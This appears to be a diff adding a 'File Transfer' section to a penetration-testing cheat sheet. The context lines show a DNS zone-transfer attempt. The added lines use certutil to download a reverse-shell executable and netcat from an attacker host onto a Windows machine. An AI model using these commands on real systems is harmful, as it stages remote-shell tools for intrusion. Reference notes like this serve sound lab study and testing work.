@@ -1017,3 +1017,14 @@ nslookup -type=AXFR contoso.local 10.10.10.5 | tee dns_zone_transfer.txt
 # Resolve domain name
 nslookup contoso.local 10.10.10.5
 ```
+
+### File Transfer&#x20;
+
+#### Windows
+
+<pre><code><strong>#don't forget to try ports 80 and 443
+</strong><strong>certutil -split -urlcache -f http://&#x3C;IP>/rev.exe C:\Temp\rev.exe
+</strong>certutil -urlcache -split -f http://192.168.45.210:80/nc.exe C:/Windows/Temp/nc.exe
+</code></pre>
+
+#### Linux
